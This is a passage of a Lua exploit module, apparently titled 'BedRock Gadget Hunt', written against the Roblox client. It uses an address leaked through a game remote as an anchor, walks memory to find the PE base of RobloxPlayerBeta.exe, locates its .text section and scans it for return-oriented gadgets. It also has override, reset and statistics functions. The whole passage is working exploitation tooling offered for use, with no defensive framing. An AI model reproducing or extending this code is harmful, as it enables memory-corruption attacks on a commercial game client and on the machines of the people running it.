                    if p and p.anomalyScore and p.anomalyScore >= 0.45 and
                       p.payload and type(p.payload.__bre_addr) == "number" and
                       p.payload.__bre_addr > 0x7FF000000000 then
                        log("INFO", string.format(
                            "Anchor updated from probe log entry #%d: 0x%X",
                            i, p.payload.__bre_addr))
                        CFG.Anchor = p.payload.__bre_addr
                        break
                    end
                end
            end
        end
    end

    -- Expand walk range if anchor may be far from PE base.
    -- Default 512 pages = 2MB. If the anchor is deep in a large binary
    -- (e.g. RobloxPlayerBeta.exe > 40MB), we may need to walk further.
    -- Cap at 4096 pages (16MB) to avoid runaway scans.
    if CFG.MaxPEWalkPages < 1024 then
        CFG.MaxPEWalkPages = 1024
        log("INFO", "MaxPEWalkPages expanded to 1024 (~4MB walk range)")
    end

    log("INFO", string.format(
        "BGH Full Run — sink: %s  remote class: %s",
        sinkRemote, remoteInst.ClassName))

    task.spawn(function()
        local ok, err = pcall(function()
            -- Baseline
            local baseline = recordGHBaseline(remoteInst, sinkRemote)

            -- Phase 1: Find PE base (skip if TextBase already known)
            if not BGH.TextBase then
                local peBase = BGH.FindPEBase(remoteInst, baseline)
                if not peBase then
                    error("PE base not found")
                end

                -- Phase 2: Locate .text section
                local textBase, textSize =
                    BGH.LocateTextSection(remoteInst, peBase, baseline)
                if not textBase then
                    error(".text section not located")
                end
            else
                log("INFO", string.format(
                    "Using preset .text: base=0x%X  size=0x%X",
                    BGH.TextBase, BGH.TextSize or 0))
            end

            -- Phase 3-7: Scan
            BGH.ScanTextSegment(remoteInst, baseline)
        end)

        if not ok then
            setState(BGH.STATE.ERROR)
            log("ERROR", tostring(err))
        end
    end)

    return true, nil
end

-- ── Manual .text override ──────────────────────────────────────────────────────
-- If PE parsing is imprecise, caller can supply known .text bounds directly.
function BGH.SetTextBounds(base, size)
    CFG.TextBase  = base
    CFG.TextSize  = size
    BGH.TextBase  = base
    BGH.TextSize  = size
    log("INFO", string.format(
        "Manual .text bounds: 0x%X  size=0x%X", base, size))
end

-- ── Anchor override ────────────────────────────────────────────────────────────
-- Set the anchor address used for PE header walking.
-- Should be called with a known code address inside .text before BGH.Run().
-- BRE calls this automatically when a confirmed primitive is found.
function BGH.SetAnchor(addr)
    if type(addr) ~= "number" or addr == 0 then
        warn("[BGH] SetAnchor: invalid address " .. tostring(addr))
        return false
    end
    CFG.Anchor = addr
    log("INFO", string.format("Anchor updated: 0x%X", addr))
    return true
end

-- ── Reset ──────────────────────────────────────────────────────────────────────
function BGH.Reset()
    setState(BGH.STATE.IDLE)
    BGH.Gadgets   = {}
    BGH.ByteCache = {}
    BGH.PEBase    = nil
    BGH.TextBase  = nil
    BGH.TextSize  = nil
    BGH.Stats     = {
        pagesWalked=0, bytesRead=0, retFound=0,
        sequencesChecked=0, forbidden=0, confirmed=0,
        readErrors=0, cacheHits=0,
    }
    log("INFO", "BGH reset")
end

-- ── GetStats ───────────────────────────────────────────────────────────────────
function BGH.GetStats()
    return {
        state            = BGH.CurrentState,
        peBase           = BGH.PEBase,
        textBase         = BGH.TextBase,
        textSize         = BGH.TextSize,
        pagesWalked      = BGH.Stats.pagesWalked,
        bytesRead        = BGH.Stats.bytesRead,
        retFound         = BGH.Stats.retFound,
        sequencesChecked = BGH.Stats.sequencesChecked,
        forbidden        = BGH.Stats.forbidden,
        confirmed        = BGH.Stats.confirmed,
        readErrors       = BGH.Stats.readErrors,
        cacheHits        = BGH.Stats.cacheHits,
        gadgets          = #BGH.Gadgets,
    }
end

-- ── Export ─────────────────────────────────────────────────────────────────────
_G.PC       = _G.PC or {}
_G.PC.BGH   = BGH
print(string.format("[BGH] BedRock Gadget Hunt v%s ready.", BGH.VERSION))
